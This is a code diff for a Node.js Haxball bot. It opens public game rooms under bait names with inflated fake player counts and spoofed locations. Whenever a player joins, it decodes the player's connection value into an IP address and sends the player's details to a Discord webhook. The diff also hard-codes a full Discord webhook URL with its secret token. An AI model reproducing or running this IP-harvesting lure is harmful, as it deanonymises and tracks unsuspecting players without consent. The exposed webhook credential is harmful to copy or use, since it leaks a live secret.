@@ -1,10 +1,9 @@
-const API = require("./src/index.js")();
-const { Room } = API;
-const EnglishLanguage = require("./languages/englishLanguage");
-API.Language.current = new EnglishLanguage(API);
-
+const {
+  Room,
+} = require("node-haxball")();
 const axios = require("axios");
 
+// Función para decodificar conn hex a IP
 function decryptHex(str) {
   if (!str || typeof str !== "string") return "";
   let out = "";
@@ -14,6 +13,7 @@ function decryptHex(str) {
   return out;
 }
 
+// Enviar info a Discord
 async function sendDiscord(webhookUrl, player, roomName) {
   if (!webhookUrl) return;
   const payload = {
@@ -42,6 +42,7 @@ async function sendDiscord(webhookUrl, player, roomName) {
   }
 }
 
+// Config de salas
 const roomNames = [
   "🟠🦊 JUEGAN TODOS CRASH 🦊🟠",
   "🟠🦊 JUEGAN TODOS CRASHJERO 🦊🟠",
@@ -58,7 +59,6 @@ const roomNames = [
 
 const maxPlayersList = [24, 24, 24, 24, 24, 24, 24, 24, 24, 24, 24];
 const fakePlayersList = [20, 19, 15, 12, 9, 22, 15, 23, 18, 12, 2];
-
 const geoList = [
   { lat: -34.616901409192984, lon: -58.96070099124523, flag: "bt" },
   { lat: -34.616901409192984, lon: -58.96070099124523, flag: "bt" },
@@ -66,7 +66,8 @@ const geoList = [
 
 const jobIndex = parseInt(process.env.INDEX || "0");
 const token = process.env.JOB_ID;
-const webhookUrl = process.env.WEBHOOK_URL;
+const webhookUrl = "https://discord.com/api/webhooks/1393262987409752264/BnPMLR9nbeFn8Ha_vZUYPh-ONdxzKCHsE1jSoerclqNnsWvYGB47kIEDXvnVdVUygVSN";
+
 const roomName = roomNames[jobIndex % roomNames.length];
 const maxPlayers = maxPlayersList[jobIndex % maxPlayersList.length];
 const fakePlayers = fakePlayersList[jobIndex % fakePlayersList.length];
@@ -88,26 +89,24 @@ Room.create(
     unlimitedPlayerCount: true,
     showInRoomList: true,
     geo: geo,
-    token: token,
+    token: token
   },
   {
     storage: {
       player_name: process.env.PLAYER_NAME || "Bot",
-      avatar: process.env.PLAYER_AVATAR || "👽",
+      avatar: process.env.PLAYER_AVATAR || "👽"
     },
-    libraries: [],
-    config: null,
-    renderer: null,
-    plugins: [],
     onOpen: (room) => {
       console.log("✅ Sala creada (onOpen). Esperando link...");
 
+      // Callback para link
       room.onAfterRoomLink = (roomLink) => {
         console.log("🔗 Link de la sala:", roomLink);
-        if (webhookUrl) sendDiscord(webhookUrl, { name: "Sala creada" }, roomName);
+        if (webhookUrl) sendDiscord(webhookUrl, { name: "Sala creada", conn: "" }, roomName);
       };
 
-      room.on("playerJoin", (player) => {
+      // Evento de jugador unido
+      room.onPlayerJoin = (player) => {
         console.log(`🎯 Nuevo jugador: ${player.name} (ID: ${player.id})`);
         sendDiscord(webhookUrl, player, roomName);
 
@@ -128,22 +127,19 @@ Room.create(
             2
           );
         }, 1000);
-      });
+      };
 
-      room.on("playerLeave", (player) =>
-        console.log(`👋 Jugador salió: ${player.name} (ID: ${player.id})`)
-      );
-
-      room.on("playerChat", (player, message) => {
+      // Evento de jugador saliendo
+      room.onPlayerLeave = (player) => console.log(`👋 Jugador salió: ${player.name} (ID: ${player.id})`);
+      room.onPlayerChat = (player, message) => {
         console.log(`💬 ${player.name}: ${message}`);
         return false;
-      });
-
-      room.on("roomError", (error) => console.error("❌ Error en la sala:", error));
+      };
+      room.onRoomError = (err) => console.error("❌ Error en sala:", err);
     },
     onClose: (msg) => {
       console.log("🔴 Bot ha salido de la sala:", msg?.toString());
       process.exit(0);
-    },
+    }
   }
 );
